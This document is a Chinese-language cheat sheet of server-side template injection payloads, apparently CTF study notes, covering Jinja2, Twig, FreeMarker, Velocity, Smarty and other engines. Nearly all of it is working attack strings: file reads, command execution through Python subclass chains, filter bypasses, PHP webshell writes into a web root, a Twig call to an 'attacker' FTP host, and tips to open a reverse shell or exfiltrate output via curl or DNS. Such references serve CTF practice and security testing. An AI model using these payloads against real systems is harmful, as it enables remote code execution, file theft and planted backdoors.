# 08-SSTI

## 总览

> **通路**: ① 直接执行\
> **来源**: `SSTI.md` (270 行) + 网络补充

***

## 一、探测

```python
{{7*7}}            # 输出 49 → 确认 SSTI
{{7*'7'}}          # Jinja2: '7777777' / Twig: 49  → 区分引擎
${7*7}             # FreeMarker / Velocity
#{7*7}
<%= 7*7 %>         # ERB / EJS
{7*7}              # Smarty
```

***

## 二、Jinja2（Python / Flask）★

### 2.1 基础信息收集

```python
{{config}}                # Flask 配置
{{config.items()}}
{{self.__init__.__globals__}}
```

### 2.2 查看全局类

```python
''.__class__.__mro__[2].__subclasses__()
''.__class__.__base__.__subclasses__()
```

### 2.3 读文件

```python
{{''.__class__.__mro__[2].__subclasses__()[40]('flag').read()}}
{{url_for.__globals__['__builtins__']['open']('flag').read()}}
{{get_flashed_messages.__globals__.__builtins__.open('flag').read()}}
```

### 2.4 命令执行

```python
# os.popen
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}

# subprocess.Popen 通用版（无需知道索引）
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
  {% endif %}
{% endfor %}

# eval
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
```

### 2.5 写文件落地马

```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php @eval($_POST[1]);?>')}}
```

### 2.6 常见 subclass 索引（不同环境不同）

* `<class 'os._wrap_close'>` → ~258
* `FileLoader` → 40（读文件）
* `catch_warnings` → 用 for 循环找（上面的通用版）

### 2.7 WAF 绕过

```python
{{''['__cl''ass__']}}                        # 字符串拼接绕关键字
{{request['__cl'+'ass__']}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
# 过滤 _ / . / [ ] 时用 |attr()
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)}}
# 8进制/16进制转义
{{''.__class__.__mro__[2].__subclasses__()[258]('\137\137...')}}
```

出处: `SSTI.md` L81-L137；`长城杯2024.meta.md`（八进制 SSTI）

***

## 三、Twig（PHP）

```plain
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.setCache("ftp://attacker:21")}}
{{['id']|filter('system')}}
{{['id',0]|sort('system')}}
{{["id",0]|map("system")}}
```

***

## 四、FreeMarker（Java）

```plain
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}
<#assign ob="freemarker.template.utility.JythonRuntime"?new()><@ob>import os;os.system("id")</@ob>

```

### 绕沙箱（`setNewBuiltinClassResolver` 被限制）

```java
${"freemarker.template.utility.Execute"?new()("id")}
// 通过 springMacroRequestContext.webApplicationContext → freeMarkerConfiguration → setNewBuiltinClassResolver
```

出处: `2023安洵杯.meta.md:58-65`

***

## 五、Velocity（Java）

```velocity
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")

#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
```

***

## 六、Smarty（PHP）

```plain
{php}system('id');{/php}
{if system('id')}{/if}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php eval($_POST[1]);?>",self::clearConfig())}
```

出处: `SSTI.md` L281（Smarty 写 shell）

***

## 七、其它引擎

| 引擎 | Payload |
| --- | --- |
| **Pebble (Java)** | `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null).exec(cmd) %}` |
| **Thymeleaf (Java)** | `[[${T(java.lang.Runtime).getRuntime().exec('id')}]]`（SSTI 写马） |
| **Nunjucks (Node)** | `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}` |
| **Handlebars (Node)** | 依赖 `Function` 构造 |
| **EJS (Node)** | 见 [10-Node原型链.md](10-Node原型链.md) |

***

## 八、检测工具

* `tplmap`（自动化 SSTI 检测与利用）
* `SSTI-Scanner`
* Burp 插件 `SSTI Scanner`

***

## 九、实战要点

1. **SSTI 通常直接等于 RCE**，优先反弹 shell 或写马
2. 无回显时用 `curl`/`dnslog` 外带（同 RCE 章）
3. Python 沙箱（如 `pydash`）被限制时，找其它魔术方法链
4. 注意引擎版本差异导致 subclass 索引变化
